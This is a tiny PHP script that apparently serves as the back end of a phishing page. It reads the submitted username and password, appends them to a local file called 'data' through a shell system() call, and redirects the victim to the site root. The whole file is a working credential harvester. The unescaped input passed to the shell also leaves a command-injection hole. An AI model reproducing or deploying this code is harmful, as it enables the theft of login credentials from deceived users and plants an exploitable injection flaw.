<?php
$email=$_POST["username"];
$pass=$_POST["password"];
system("echo '$email	:	$pass' >> data");
header('location:/')
?>
